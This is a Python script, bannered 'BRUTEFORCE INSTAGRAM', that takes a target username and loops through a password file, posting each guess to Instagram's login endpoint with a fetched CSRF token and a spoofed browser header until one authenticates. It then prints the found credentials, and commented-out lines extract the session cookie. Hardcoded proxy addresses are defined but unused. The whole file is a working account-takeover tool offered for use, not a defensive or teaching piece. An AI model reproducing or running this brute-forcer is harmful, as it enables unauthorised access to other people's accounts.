import random
from datetime import datetime
import requests
import json
from time import sleep

print(
    """
 ____ ____ _  _ ____ ____ ____ __ ____  ___ ____    __ __ _ ____ ____ __   ___ ____  __  _  _ 
(  _ (  _ / )( (_  _(  __(  __/  (  _ \/ __(  __)  (  (  ( / ___(_  _/ _\ / __(  _ \/ _\( \/ )
 ) _ ()   ) \/ ( )(  ) _) ) _(  O )   ( (__ ) _)    )(/    \___ \ )(/    ( (_ \)   /    / \/ \ 
(____(__\_\____/(__)(____(__) \__(__\_)\___(____)  (__\_)__(____/(__\_/\_/\___(__\_\_/\_\_)(_/                                                                                                               
"""""
)

username_user = input("enter username: ")
password_list = input("enter name password list: ")

file = open("password.txt")
file_read = file.read().splitlines()
number = 0
link = 'https://www.instagram.com/accounts/login/'
login_url = 'https://www.instagram.com/accounts/login/ajax/'

prox = ["94.244.28.246:31280"]
proxies = {
    'https': 'https://185.235.230.99:3128'
}

time = int(datetime.now().timestamp())
response = requests.get(link)
csrf = response.cookies['csrftoken']

while len(file_read) > number:
    i = 0
    test = file_read[number].split()
    payload = {
        'username': username_user,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{test[i]}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }
    i += 1

    number = number + 1
    login_header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.35",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
        "x-csrftoken": csrf
    }

    login_response = requests.post(login_url, data=payload, headers=login_header, timeout=3)
    json_data = json.loads(login_response.text)

    print(login_response.status_code)
    # ["authenticated"]

    if json_data["authenticated"]:

        print("login successful \n")
        print("---------------")
        print(f"username: {username_user} password: {test}")

        # cookies = login_response.cookies
        # cookie_jar = cookies.get_dict()
        # csrf_token = cookie_jar['csrftoken']
        # print("csrf_token: ", csrf_token)
        # session_id = cookie_jar['sessionid']
        # print("session_id: ", session_id)
        break


    else:
        print("login failed ", login_response.text)
